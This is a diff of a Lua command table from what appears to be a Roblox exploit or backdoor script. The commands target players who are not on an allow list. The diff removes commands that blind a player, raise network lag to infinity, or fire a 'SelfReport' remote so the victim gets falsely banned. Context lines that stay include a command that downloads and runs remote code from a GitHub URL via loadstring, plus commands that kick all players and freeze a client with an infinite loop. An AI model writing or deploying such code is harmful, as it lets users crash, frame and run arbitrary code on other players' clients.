@@ -10499,21 +10499,6 @@ local commands = {
 			end
 		end
 	end,
-	[".blind"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local blur = Instance.new("BlurEffect")
-			blur.Size = 10000000000000
-			blur.Parent = game.Lighting
-		end
-	end,
-	[".unblind"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
-			if blur then
-				blur:Destroy()
-			end
-		end
-	end,
 	[".troll"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
@@ -10525,13 +10510,6 @@ local commands = {
 			for index, player in pairs(game.Players:GetPlayers()) do
 				player:Kick("You Just Got Kicked By Void")
 			end
-		end
-	end,
-	[".ban"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local rs = game:GetService("ReplicatedStorage")
-			local remote = rs:FindFirstChild("SelfReport", true)
-			remote:FireServer("injection_detected")
 		end
 	end,
 	[".rickroll"] = function()
@@ -10598,12 +10576,6 @@ local commands = {
 	[".crash"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			while true do end
-		end
-	end,
-	[".infping"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local thingy = settings().Network
-			thingy.IncomingReplicationLag = math.huge
 		end
 	end,
 	[".lag"] = function()
